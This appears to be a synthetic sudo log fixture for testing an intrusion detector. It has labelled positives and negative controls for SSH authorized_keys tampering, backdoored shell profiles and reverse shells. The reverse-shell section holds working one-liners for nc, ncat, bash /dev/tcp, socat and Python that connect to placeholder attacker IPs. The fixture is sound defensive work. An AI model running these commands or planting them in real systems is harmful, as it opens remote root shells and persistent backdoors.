# Move prepared file into authorized_keys
Dec 21 20:31:10 webserver sudo[11307]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/root_keys /root/.ssh/authorized_keys

# Move file into another user's authorized_keys
Dec 21 20:31:20 webserver sudo[11308]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/mv /tmp/admin_keys /home/admin/.ssh/authorized_keys


# === NEGATIVE CONTROLS ===

# Read authorized_keys only
Dec 21 20:32:00 webserver sudo[11310]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.ssh/authorized_keys

# Change permissions only
Dec 21 20:32:10 webserver sudo[11311]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 600 /root/.ssh/authorized_keys

# Create .ssh directory only
Dec 21 20:32:20 webserver sudo[11312]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/mkdir -p /root/.ssh

# Generate a key but do not install it
Dec 21 20:32:30 webserver sudo[11313]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh-keygen -t rsa -N '' -f /root/.ssh/id_rsa

# Copy to a similarly named backup file
Dec 21 20:32:40 webserver sudo[11314]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test /root/.ssh/authorized_keys.backup

# Move to unrelated file
Dec 21 20:32:50 webserver sudo[11315]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/test /tmp/authorized_keys
# === SHELL PROFILE PERSISTENCE TESTS ===

# HIGH: printf writes suspicious command into .bashrc
Dec 21 20:40:00 webserver sudo[11400]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'printf "bash /tmp/.evil.sh &" >> /root/.bashrc'

# HIGH: printf writes suspicious command into .profile
Dec 21 20:40:10 webserver sudo[11401]: alice : TTY=pts/5 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -c 'printf "python /dev/shm/.agent.py &" >> /home/alice/.profile'

# MEDIUM: tee modifies .bashrc
Dec 21 20:40:20 webserver sudo[11402]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tee -a /root/.bashrc

# MEDIUM: tee modifies .profile
Dec 21 20:40:30 webserver sudo[11403]: alice : TTY=pts/5 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /home/deploy/.profile

# MEDIUM: copy file over .bashrc
Dec 21 20:40:40 webserver sudo[11404]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/bashrc.backdoor /root/.bashrc

# MEDIUM: copy file over /etc/profile
Dec 21 20:40:50 webserver sudo[11405]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/profile.backdoor /etc/profile

# MEDIUM: move file over user .profile
Dec 21 20:41:00 webserver sudo[11406]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/profile.new /home/deploy/.profile

# MEDIUM: move file over /etc/bash.bashrc
Dec 21 20:41:10 webserver sudo[11407]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/bashrc.new /etc/bash.bashrc

# MEDIUM: sed modifies .bashrc
Dec 21 20:41:20 webserver sudo[11408]: alice : TTY=pts/5 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/sed -i 's/export SAFE=1/export SAFE=0/' /root/.bashrc

# MEDIUM: sed modifies /etc/profile
Dec 21 20:41:30 webserver sudo[11409]: alice : TTY=pts/5 ; PWD=/etc ; USER=root ; COMMAND=/usr/bin/sed -i 's/umask 022/umask 000/' /etc/profile

# MEDIUM: normal-looking profile modification
Dec 21 20:41:40 webserver sudo[11410]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "export JAVA_HOME=/opt/java" >> /root/.bashrc'

# MEDIUM: only one weak indicator
Dec 21 20:41:50 webserver sudo[11411]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/sh -c 'echo "bash /opt/admin/start.sh" >> /root/.profile'
# === REVERSE SHELL DETECTION TESTS ===

# ------------------------------------------------------------
# 1. NETCAT / NC
# ------------------------------------------------------------

# HIGH: nc -e with bash
Dec 21 21:00:00 webserver sudo[12000]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 198.51.100.24 4444

# HIGH: nc -e with sh
Dec 21 21:00:10 webserver sudo[12001]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 203.0.113.10 5555


# ------------------------------------------------------------
# 2. NCAT
# ------------------------------------------------------------

# HIGH: ncat --exec with bash
Dec 21 21:01:00 webserver sudo[12010]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --exec /bin/bash 198.51.100.24 4444

# HIGH: ncat --exec with sh
Dec 21 21:01:10 webserver sudo[12011]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --exec /bin/sh 203.0.113.10 5555


# ------------------------------------------------------------
# 3. BASH / SH USING /dev/tcp
# ------------------------------------------------------------

# HIGH: bash reverse shell using /dev/tcp
Dec 21 21:02:00 webserver sudo[12020]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.24/4444 0>&1'

# HIGH: sh reverse shell using /dev/tcp
Dec 21 21:02:10 webserver sudo[12021]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'sh -i >& /dev/tcp/203.0.113.10/5555 0>&1'

# HIGH: alternate bash /dev/tcp target
Dec 21 21:02:20 webserver sudo[12022]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.50/7777 0>&1'


# ------------------------------------------------------------
# 4. SOCAT
# ------------------------------------------------------------

# HIGH: socat EXEC bash
Dec 21 21:03:00 webserver sudo[12030]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP:198.51.100.24:4444 EXEC:/bin/bash

# HIGH: socat EXEC sh
Dec 21 21:03:10 webserver sudo[12031]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP4:203.0.113.10:5555 EXEC:/bin/sh

# HIGH: socat SYSTEM bash
Dec 21 21:03:20 webserver sudo[12032]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP:198.51.100.24:6666 SYSTEM:bash -i


# ------------------------------------------------------------
# 5. PYTHON - socket + connect + dup2
# ------------------------------------------------------------

# HIGH: Python dup2 reverse shell using bash
Dec 21 21:04:00 webserver sudo[12040]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os;s=socket.socket();s.connect(("198.51.100.24",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/bash")'

# HIGH: Python dup2 reverse shell using sh
Dec 21 21:04:10 webserver sudo[12041]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os;s=socket.socket();s.connect(("203.0.113.10",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh")'


# ------------------------------------------------------------
# 6. PYTHON - socket + connect + subprocess
# ------------------------------------------------------------

# HIGH: Python subprocess reverse shell using bash
Dec 21 21:05:00 webserver sudo[12050]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("198.51.100.24",6666));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# HIGH: Python subprocess reverse shell using sh
Dec 21 21:05:10 webserver sudo[12051]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python -c 'import socket,subprocess;s=socket.socket();s.connect(("203.0.113.10",7777));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'


# ------------------------------------------------------------
# 7. PYTHON - socket + connect + pty.spawn
# ------------------------------------------------------------

# HIGH: Python PTY reverse shell using bash
Dec 21 21:06:00 webserver sudo[12060]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("198.51.100.24",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# HIGH: Python PTY reverse shell using sh
Dec 21 21:06:10 webserver sudo[12061]: alice : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("203.0.113.10",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


# ============================================================
# NEGATIVE CONTROLS - SHOULD NOT TRIGGER
# ============================================================

# nc port check only - no shell execution
Dec 21 21:10:00 webserver sudo[12100]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -zv 127.0.0.1 80

# ncat normal connection - no --exec
Dec 21 21:10:10 webserver sudo[12101]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat 127.0.0.1 8080

# normal bash command
Dec 21 21:10:20 webserver sudo[12102]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/bash -c 'echo hello'

# bash mentions ordinary file, no /dev/tcp
Dec 21 21:10:30 webserver sudo[12103]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/admin-script.sh

# socat port forwarding only - no EXEC or SYSTEM shell
Dec 21 21:10:40 webserver sudo[12104]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80

# socat EXEC non-shell program
Dec 21 21:10:50 webserver sudo[12105]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:8081 EXEC:/usr/bin/id

# Python local PTY shell only - no network connection
Dec 21 21:11:00 webserver sudo[12110]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'

# Python socket connection only - no shell
Dec 21 21:11:10 webserver sudo[12111]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket;s=socket.socket();s.connect(("127.0.0.1",8080))'

# Python subprocess only - no socket
Dec 21 21:11:20 webserver sudo[12112]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import subprocess;subprocess.call(["/bin/ls","-la"])'

# Python dup2 only - no socket/connect/shell
Dec 21 21:11:30 webserver sudo[12113]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os;os.dup2(1,2)'

# Python executes shell locally but has no socket connection
Dec 21 21:11:40 webserver sudo[12114]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c 'import os;os.system("/bin/bash -c \"echo test\"")'
# === NEGATIVE CONTROLS ===

# Read only
Dec 21 20:42:00 webserver sudo[11420]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /root/.bashrc

# Change permissions only
Dec 21 20:42:10 webserver sudo[11421]: admin : TTY=pts/6 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod 644 /root/.bashrc

# Change ownership only
Dec 21 20:42:20 webserver sudo[11422]: admin : TTY=pts/6 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chown deploy:deploy /home/deploy/.profile

# Modify unrelated file
Dec 21 20:42:30 webserver sudo[11423]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo "bash /tmp/test.sh &" >> /tmp/test.conf'

# Copy to unrelated file
Dec 21 20:42:40 webserver sudo[11424]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test /tmp/.bashrc.backup
# === END OF EXPANDED DATASET ===
